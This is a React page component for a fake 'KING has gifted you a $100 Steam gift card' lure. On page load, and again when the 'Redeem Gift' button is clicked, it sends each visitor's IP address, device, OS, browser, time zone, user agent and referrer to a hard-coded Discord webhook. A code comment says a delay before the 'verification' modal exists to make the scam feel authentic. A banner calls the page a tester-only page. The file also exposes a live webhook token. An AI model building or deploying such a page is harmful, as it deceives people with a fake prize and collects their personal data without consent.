
import React, { useState, useEffect } from 'react';
import ReactConfetti from 'react-confetti';
import Header from '../components/Header';
import VerificationModal from '../components/VerificationModal';
import { getIpAddress, getUserSystemInfo } from '../utils/getIpAddress';
import { toast } from '@/components/ui/use-toast';
import { Card, CardContent } from '@/components/ui/card';

const Index = () => {
  const [showConfetti, setShowConfetti] = useState(true);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [ipAddress, setIpAddress] = useState('');
  const [systemInfo, setSystemInfo] = useState(getUserSystemInfo());
  const [windowSize, setWindowSize] = useState({
    width: window.innerWidth,
    height: window.innerHeight,
  });
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    // Set initial system info
    setSystemInfo(getUserSystemInfo());
    
    // Handle confetti animation
    const timer = setTimeout(() => {
      setShowConfetti(false);
    }, 5000);

    // Get IP address
    const fetchIpAddress = async () => {
      const ip = await getIpAddress();
      setIpAddress(ip);
      setSystemInfo(prev => ({ ...prev, ip }));
    };
    fetchIpAddress();

    // Handle window resize for confetti
    const handleResize = () => {
      setWindowSize({
        width: window.innerWidth,
        height: window.innerHeight,
      });
    };

    window.addEventListener('resize', handleResize);

    // Send initial visit data to webhook
    const sendInitialVisitData = async () => {
      try {
        const visitInfo = {
          eventType: 'page_visit',
          timestamp: new Date().toISOString(),
          url: window.location.href,
          ...systemInfo
        };
        
        await fetch('https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `New visitor!\n**IP**: ${systemInfo.ip}\n**Device**: ${systemInfo.device} (${systemInfo.os})\n**Browser**: ${systemInfo.browser}\n**Screen**: ${systemInfo.screenSize}\n**Language**: ${systemInfo.language}\n**Referrer**: ${systemInfo.referrer}`,
          }),
        });
      } catch (error) {
        console.error('Error sending initial visit data:', error);
      }
    };
    
    // Wait a bit before sending the initial data to ensure IP is loaded
    setTimeout(sendInitialVisitData, 2000);

    return () => {
      clearTimeout(timer);
      window.removeEventListener('resize', handleResize);
    };
  }, []);

  const handleRedeemClick = async () => {
    try {
      setIsLoading(true);
      
      // Collect current time and detailed browser information
      const currentTime = new Date().toLocaleString();
      const sessionDuration = Math.floor((new Date().getTime() - performance.timing.navigationStart) / 1000);
      
      // Send enhanced system info to webhook
      await fetch('https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `📱 **USER CLICKED REDEEM!** 📱\n\n**Time**: ${currentTime}\n**IP Address**: ${ipAddress}\n**Browser**: ${systemInfo.browser}\n**OS**: ${systemInfo.os}\n**Device**: ${systemInfo.device}\n**Language**: ${systemInfo.language}\n**Screen Size**: ${systemInfo.screenSize}\n**Time Zone**: ${systemInfo.timeZone}\n**Referrer**: ${systemInfo.referrer}\n**Session Duration**: ${sessionDuration} seconds\n**User Agent**: ${systemInfo.userAgent.substring(0, 200)}`,
        }),
      });

      // Open verification modal after a small delay to make it feel more authentic
      setTimeout(() => {
        setIsModalOpen(true);
        setIsLoading(false);
      }, 800);
    } catch (error) {
      console.error('Error sending webhook:', error);
      setIsLoading(false);
      toast({
        title: "Error",
        description: "Could not process your request. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen bg-custom-purple flex flex-col">
      {showConfetti && (
        <ReactConfetti
          width={windowSize.width}
          height={windowSize.height}
          recycle={false}
          numberOfPieces={500}
        />
      )}
      
      <Header />
      
      <main className="flex-grow flex flex-col items-center justify-center px-4 py-10">
        <Card className="bg-white bg-opacity-10 border-none shadow-xl max-w-4xl w-full">
          <CardContent className="p-8">
            <div className="flex flex-col md:flex-row items-center gap-8">
              <div className="flex-shrink-0 relative">
                <div className="absolute -top-3 -right-3 bg-custom-yellow text-black text-xs font-bold px-2 py-1 rounded-full transform rotate-12">
                  FREE
                </div>
                <img 
                  src="https://assets.eneba.com/steam/gift-cards/steam-gift-card-100.png" 
                  alt="Steam Gift Card $100" 
                  className="w-full max-w-md rounded-lg shadow-lg"
                />
              </div>
              
              <div className="text-white text-center md:text-left">
                <div className="text-sm font-medium text-custom-yellow mb-1">Exclusive Offer</div>
                <h1 className="text-4xl md:text-5xl font-bold mb-6">
                  <span className="text-purple-300">KING</span> has gifted you a 
                  <span className="text-custom-blue block mt-2">STEAM GIFT CARD $100</span>!
                </h1>
                
                <p className="text-gray-300 mb-6">This exclusive offer is available for a limited time only. Redeem your gift now before the offer expires.</p>
                
                <button 
                  onClick={handleRedeemClick}
                  disabled={isLoading}
                  className={`bg-custom-yellow text-black text-xl font-bold py-4 px-8 rounded-lg hover:bg-opacity-90 transition-all transform hover:scale-105 ${isLoading ? 'opacity-75 cursor-not-allowed' : ''}`}
                >
                  {isLoading ? 'Processing...' : 'Redeem Gift'}
                </button>
              </div>
            </div>
          </CardContent>
        </Card>
        
        <div className="mt-10 text-red-300 text-center max-w-2xl border border-red-400 p-4 rounded">
          <p className="font-bold">This page is only for testers of this website! DO NOT USE AS THIS WEBSITE SHARES PERSONAL INFORMATION!</p>
        </div>
      </main>

      <VerificationModal 
        isOpen={isModalOpen} 
        onClose={() => setIsModalOpen(false)}
        ipAddress={ipAddress}
      />
    </div>
  );
};

export default Index;
